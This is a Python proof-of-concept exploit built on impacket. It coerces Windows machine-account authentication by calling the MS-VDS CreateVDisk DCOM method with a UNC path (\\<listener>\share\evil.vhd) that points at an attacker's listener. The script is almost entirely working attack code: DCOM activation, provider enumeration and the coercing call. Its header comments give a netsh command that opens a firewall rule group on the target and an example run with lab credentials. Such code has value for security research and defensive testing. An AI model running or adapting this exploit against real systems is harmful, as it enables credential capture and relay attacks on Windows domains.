#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with
# MS-VDS::IVdsVdProvider::CreateVDisk() (opnum 4).
#
# CreateVDisk creates a virtual-disk backing file at pPath. pPath is
# "the name and directory path for the backing file" ([MS-VDS] 3.4.5.2.15.2);
# a UNC path makes the Virtual Disk Service (running as the machine account)
# create/open the file on the listener and therefore authenticate to it.
#
# This is a DCOM method, reached by activating the Virtual Disk Service and
# walking the object model to a virtual-disk provider:
#   CoCreateInstanceEx(CLSID_VirtualDiskService, IID_IVdsServiceInitialization)
#   IVdsServiceInitialization::Initialize(NULL)                       [opnum 3]
#   QueryInterface -> IID_IVdsService
#   IVdsService::WaitForServiceReady                                  [opnum 4]
#   IVdsService::QueryProviders(VDS_QUERY_VIRTUALDISK_PROVIDERS=0x4)  [opnum 6]
#   IEnumVdsObject::Next                                              [opnum 3]
#   QueryInterface -> IID_IVdsVdProvider   (on each returned provider)
#   IVdsVdProvider::CreateVDisk(pPath="\\<listener>\share\evil.vhd")  [opnum 4]
#
# PREREQUISITES on the target:
#   1. Local administrator rights (VDS interface ACL).
#   2. The "Remote Volume Management" firewall rule group must be ENABLED
#      (disabled by default). VDS is DCOM-only and its interface calls use the
#      RPC dynamic port range (49152-65535); with the group disabled the DCOM
#      activation on TCP/135 succeeds but every interface call is dropped by the
#      firewall. Enable it on the target with:
#        netsh advfirewall firewall set rule group="Remote Volume Management" new enable=yes
#
#   ./coerce_poc.py -d LAB.local -u user -p 'Password123!' 192.168.2.51 192.168.2.1
#     (positional order: <listener> <target>)
import argparse
import uuid

from impacket.dcerpc.v5.dcomrt import (
    DCOMConnection, INTERFACE, IRemUnknown2, PMInterfacePointer, DCOMCALL, DCOMANSWER,
)
from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRPOINTER
from impacket.dcerpc.v5.dtypes import LPWSTR, WSTR, ULONG, ULONGLONG, DWORD, GUID, NULL
from impacket.dcerpc.v5.dcom import vds
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket import hresult_errors
from impacket.uuid import string_to_bin, uuidtup_to_bin

IID_IVdsServiceInitialization = uuidtup_to_bin(('4AFC3636-DB01-4052-80C3-03BBCB8D3C69', '0.0'))
IID_IVdsService    = uuidtup_to_bin(('0818A8EF-9BA9-40D8-A6F9-E22833CC771E', '0.0'))
IID_IEnumVdsObject = uuidtup_to_bin(('118610B7-8D94-4030-B5B8-500889788E4E', '0.0'))
IID_IVdsVdProvider = uuidtup_to_bin(('B481498C-8354-45F9-84A0-0BDD2832A91F', '0.0'))

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        code = self.error_code or 0
        if code in hresult_errors.ERROR_MESSAGES:
            return 'CreateVDisk HRESULT: 0x%08x - %s' % (code, hresult_errors.ERROR_MESSAGES[code][0])
        return 'CreateVDisk HRESULT: 0x%08x' % code


VENDOR_MICROSOFT = string_to_bin('EC984AEC-A0F9-47E9-901F-71415A66345B')
DEVICE_VHD       = 2
VDS_QUERY_VIRTUALDISK_PROVIDERS = 0x4


# 2.2.1.3.6 VIRTUAL_STORAGE_TYPE
class VIRTUAL_STORAGE_TYPE(NDRSTRUCT):
    structure = (('DeviceId', ULONG), ('VendorId', GUID))


# 2.2.2.14.2.1 VDS_CREATE_VDISK_PARAMETERS
class VDS_CREATE_VDISK_PARAMETERS(NDRSTRUCT):
    structure = (
        ('UniqueId', GUID),
        ('MaximumSize', ULONGLONG),
        ('BlockSizeInBytes', ULONG),
        ('SectorSizeInBytes', ULONG),
        ('pParentPath', LPWSTR),
        ('pSourcePath', LPWSTR),
    )


class PPMInterfacePointer(NDRPOINTER):
    referent = (('Data', PMInterfacePointer),)


# 3.4.5.2.15.2 IVdsVdProvider::CreateVDisk (Opnum 4)
# VirtualDeviceType / pPath / pCreateDiskParameters are top-level [ref] pointers:
# they marshal inline (no referent id), so they are modelled as the value type
# directly (NDRSTRUCT / WSTR), NOT wrapped in a pointer.
class IVdsVdProvider_CreateVDisk(DCOMCALL):
    opnum = 4
    structure = (
        ('VirtualDeviceType', VIRTUAL_STORAGE_TYPE),
        ('pPath', WSTR),
        ('pStringSecurityDescriptor', LPWSTR),
        ('Flags', DWORD),
        ('ProviderSpecificFlags', ULONG),
        ('Reserved', ULONG),
        ('pCreateDiskParameters', VDS_CREATE_VDISK_PARAMETERS),
        ('ppAsync', PPMInterfacePointer),
    )


class IVdsVdProvider_CreateVDiskResponse(DCOMANSWER):
    structure = (('ppAsync', PPMInterfacePointer), ('ErrorCode', ULONG))


def _join(abData):
    if abData and isinstance(abData[0], (bytes, bytearray)):
        return b''.join(bytes(x) for x in abData)
    return ''.join(abData)


def _wrap(base, resp_iface_ptr):
    """Build an IRemUnknown2 for an interface pointer returned in a response field."""
    return IRemUnknown2(INTERFACE(base.get_cinstance(), _join(resp_iface_ptr['abData']),
                                  base.get_ipidRemUnknown(), target=base.get_target()))


def main():
    parser = argparse.ArgumentParser(add_help=True, description='MS-VDS CreateVDisk coercion PoC.')
    parser.add_argument('-d', '--domain', default='', help='(FQDN) domain to authenticate to.')
    parser.add_argument('-u', '--username', required=True, help='User to authenticate as.')
    parser.add_argument('-p', '--password', default='', help='Password to authenticate with.')
    parser.add_argument('--share', default='share', help='Share component of the UNC pPath.')
    parser.add_argument('listener', help='IP/hostname the target should authenticate to.')
    parser.add_argument('target', help='IP/hostname of the target VDS server.')
    args = parser.parse_args()

    unc = '\\\\%s\\%s\\evil.vhd' % (args.listener, args.share)
    print('[>] Activating CLSID_VirtualDiskService, IID_IVdsServiceInitialization ...')
    dcom = DCOMConnection(args.target, args.username, args.password, args.domain, oxidResolver=True)
    try:
        iInit = dcom.CoCreateInstanceEx(vds.CLSID_VirtualDiskService, IID_IVdsServiceInitialization)

        r = vds.IVdsServiceInitialization_Initialize()
        r['pwszMachineName'] = '\x00'
        iInit.request(r, IID_IVdsServiceInitialization, iInit.get_iPid())
        print('[+] Initialize(NULL) ok; QueryInterface -> IVdsService ...')

        iSvc = iInit.RemQueryInterface(1, (IID_IVdsService,))
        iSvc.request(vds.IVdsService_WaitForServiceReady(), IID_IVdsService, iSvc.get_iPid())
        print('[+] service ready; QueryProviders(VIRTUALDISK) ...')

        r = vds.IVdsService_QueryProviders()
        r['masks'] = VDS_QUERY_VIRTUALDISK_PROVIDERS
        resp = iSvc.request(r, IID_IVdsService, iSvc.get_iPid())
        enum = _wrap(iSvc, resp['ppEnum'])

        r = vds.IEnumVdsObject_Next()
        r['celt'] = 0xffff
        try:
            resp = enum.request(r, IID_IEnumVdsObject, enum.get_iPid())
        except Exception as e:
            resp = e.get_packet()
            if resp['ErrorCode'] != 1:  # S_FALSE -> fewer items returned
                raise
        providers = [_wrap(enum, it) for it in resp['ppObjectArray']]
        print('[+] %d virtual-disk provider(s) enumerated' % len(providers))

        for idx, prov in enumerate(providers):
            try:
                vdp = prov.RemQueryInterface(1, (IID_IVdsVdProvider,))
            except Exception as e:
                print('[i] provider[%d]: QI IVdsVdProvider failed: %s' % (idx, str(e)[:70]))
                continue
            print('[+] provider[%d]: CreateVDisk(pPath=%s) ...' % (idx, unc))

            req = IVdsVdProvider_CreateVDisk()
            vst = VIRTUAL_STORAGE_TYPE()
            vst['DeviceId'] = DEVICE_VHD
            g = GUID(); g['Data'] = VENDOR_MICROSOFT
            vst['VendorId'] = g
            req['VirtualDeviceType'] = vst
            req['pPath'] = unc + '\x00'
            req['pStringSecurityDescriptor'] = NULL
            req['Flags'] = 0                    # CREATE_VIRTUAL_DISK_FLAG_NONE
            req['ProviderSpecificFlags'] = 0
            req['Reserved'] = 0
            params = VDS_CREATE_VDISK_PARAMETERS()
            ug = GUID(); ug['Data'] = string_to_bin(str(uuid.uuid4()))
            params['UniqueId'] = ug
            params['MaximumSize'] = 4 * 1024 * 1024
            params['BlockSizeInBytes'] = 0
            params['SectorSizeInBytes'] = 0
            params['pParentPath'] = NULL
            params['pSourcePath'] = NULL
            req['pCreateDiskParameters'] = params
            # ppAsync is [in,out,unique] IVdsAsync**: send &pAsync with pAsync=NULL.
            # A NULL *outer* pointer makes the service reset the connection.
            pp = PPMInterfacePointer(); pp['Data'] = NULL
            req['ppAsync'] = pp

            try:
                vdp.request(req, IID_IVdsVdProvider, vdp.get_iPid())
                print('[+] CreateVDisk returned S_OK -- check your listener')
            except Exception as e:
                print('[i] CreateVDisk returned: %s -- check your listener' % str(e)[:80])
    finally:
        dcom.disconnect()


if __name__ == '__main__':
    main()
